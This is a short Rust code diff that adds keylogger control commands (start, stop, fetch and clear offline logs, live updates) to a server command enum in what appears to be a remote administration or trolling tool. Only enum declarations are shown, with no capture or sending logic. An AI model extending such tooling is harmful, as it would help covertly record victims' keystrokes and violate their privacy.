@@ -99,4 +99,12 @@ pub enum ServerCommand {
     UploadFile(SocketAddr, String, FileData),
 
     HandleTroll(SocketAddr, TrollCommand),
+
+    // Keylogger
+    StartKeylogger(SocketAddr, bool),
+    StopKeylogger(SocketAddr),
+    GetOfflineLogs(SocketAddr),
+    ClearOfflineLogs(SocketAddr),
+    KeyloggerUpdate(SocketAddr, KeyloggerUpdate),
+    KeyloggerOfflineLogs(SocketAddr, Vec<String>),
 }
